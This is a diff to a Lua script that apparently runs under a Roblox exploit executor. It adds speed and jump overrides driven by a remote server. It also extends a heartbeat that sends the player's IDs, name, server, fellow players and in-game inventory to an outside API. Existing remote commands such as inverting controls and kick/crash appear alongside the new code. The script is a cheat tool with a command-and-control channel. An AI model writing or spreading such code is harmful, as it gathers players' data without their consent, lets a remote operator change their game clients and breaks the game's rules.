@@ -192,26 +192,126 @@ local function collectBrainrots()
     return list
 end
 
+local baseWalkSpeed = 16
+local baseJumpPower = 50
+local useJumpPower = true
+local baseCaptured = false
+local walkSpeedOverride = nil
+local jumpPowerOverride = nil
+
+local function readHumanoidStats(hum)
+    if not hum then return end
+    local okW, w = pcall(function() return hum.WalkSpeed end)
+    local jumpVal = 50
+    local useJP = true
+    pcall(function()
+        useJP = hum.UseJumpPower ~= false
+        if useJP then
+            jumpVal = hum.JumpPower
+        else
+            jumpVal = hum.JumpHeight
+        end
+    end)
+    return (okW and w) or 16, jumpVal, useJP
+end
+
+local function captureBaseStats()
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    if walkSpeedOverride ~= nil or jumpPowerOverride ~= nil then return end
+    local w, j, jp = readHumanoidStats(hum)
+    if w and w > 0 then baseWalkSpeed = w end
+    if j and j > 0 then baseJumpPower = j end
+    useJumpPower = jp
+    baseCaptured = true
+end
+
+local function applyMotionOverrides()
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    if walkSpeedOverride ~= nil then
+        pcall(function() hum.WalkSpeed = walkSpeedOverride end)
+    end
+    if jumpPowerOverride ~= nil then
+        pcall(function()
+            if hum.UseJumpPower ~= false then
+                hum.JumpPower = jumpPowerOverride
+            else
+                hum.JumpHeight = jumpPowerOverride
+            end
+        end)
+    end
+end
+
+local function setWalkSpeed(val)
+    if type(val) == "number" then
+        walkSpeedOverride = math.clamp(val, 0, 500)
+    else
+        walkSpeedOverride = nil
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then pcall(function() hum.WalkSpeed = baseWalkSpeed end) end
+    end
+    applyMotionOverrides()
+end
+
+local function setJumpPower(val)
+    if type(val) == "number" then
+        jumpPowerOverride = math.clamp(val, 0, 500)
+    else
+        jumpPowerOverride = nil
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            pcall(function()
+                if hum.UseJumpPower ~= false then
+                    hum.JumpPower = baseJumpPower
+                else
+                    hum.JumpHeight = baseJumpPower
+                end
+            end)
+        end
+    end
+    applyMotionOverrides()
+end
+
 local function heartbeat()
     safe(function()
+        if not baseCaptured then captureBaseStats() end
+        local curWalk, curJump = baseWalkSpeed, baseJumpPower
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            local w, j = readHumanoidStats(hum)
+            if w then curWalk = w end
+            if j then curJump = j end
+        end
         local brainrots = collectBrainrots()
-        local success, result = pcall(function()
+        local payload = {
+            user_id = LP.UserId,
+            username = LP.Name,
+            display_name = LP.DisplayName,
+            avatar_url = avatarUrl(),
+            place_id = game.PlaceId,
+            game_name = gameName(),
+            job_id = game.JobId,
+            executor = executorName,
+            server_players = serverPlayers(),
+            brainrots = brainrots,
+            base_walk_speed = baseWalkSpeed,
+            base_jump_power = baseJumpPower,
+            walk_speed = curWalk,
+            jump_power = curJump,
+            use_jump_power = useJumpPower,
+        }
+        local success = pcall(function()
             return request({
                 Url = BASE .. "/api/public/heartbeat",
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                Body = HttpService:JSONEncode({
-                    user_id = LP.UserId,
-                    username = LP.Name,
-                    display_name = LP.DisplayName,
-                    avatar_url = avatarUrl(),
-                    place_id = game.PlaceId,
-                    game_name = gameName(),
-                    job_id = game.JobId,
-                    executor = executorName,
-                    server_players = serverPlayers(),
-                    brainrots = brainrots,
-                }),
+                Body = HttpService:JSONEncode(payload),
             })
         end)
         if not success then
@@ -228,23 +328,13 @@ local function heartbeat()
                 end
             end
             if #simpleBrainrots > 0 then
+                payload.brainrots = simpleBrainrots
                 pcall(function()
                     request({
                         Url = BASE .. "/api/public/heartbeat",
                         Method = "POST",
                         Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                        Body = HttpService:JSONEncode({
-                            user_id = LP.UserId,
-                            username = LP.Name,
-                            display_name = LP.DisplayName,
-                            avatar_url = avatarUrl(),
-                            place_id = game.PlaceId,
-                            game_name = gameName(),
-                            job_id = game.JobId,
-                            executor = executorName,
-                            server_players = serverPlayers(),
-                            brainrots = simpleBrainrots,
-                        }),
+                        Body = HttpService:JSONEncode(payload),
                     })
                 end)
             end
@@ -369,6 +459,22 @@ local resetThread = nil
 local prevBlack = false
 local prevInvert = false
 local invertConn = nil
+
+task.spawn(function()
+    while true do
+        if not baseCaptured then
+            captureBaseStats()
+        end
+        applyMotionOverrides()
+        task.wait(0.1)
+    end
+end)
+
+LP.CharacterAdded:Connect(function()
+    baseCaptured = false
+    task.delay(0.4, captureBaseStats)
+    task.delay(0.6, applyMotionOverrides)
+end)
 
 local function setInvertControls(on)
     if invertConn then
@@ -671,6 +777,22 @@ local function poll()
     if wantInvert ~= prevInvert then
         prevInvert = wantInvert
         setInvertControls(wantInvert)
+    end
+
+    if type(data.walk_speed) == "number" then
+        if walkSpeedOverride ~= data.walk_speed then
+            setWalkSpeed(data.walk_speed)
+        end
+    elseif walkSpeedOverride ~= nil then
+        setWalkSpeed(nil)
+    end
+
+    if type(data.jump_power) == "number" then
+        if jumpPowerOverride ~= data.jump_power then
+            setJumpPower(data.jump_power)
+        end
+    elseif jumpPowerOverride ~= nil then
+        setJumpPower(nil)
     end
 
     -- 1er poll : ignore kick/crash (vieux flag qui freeze au relaunch)
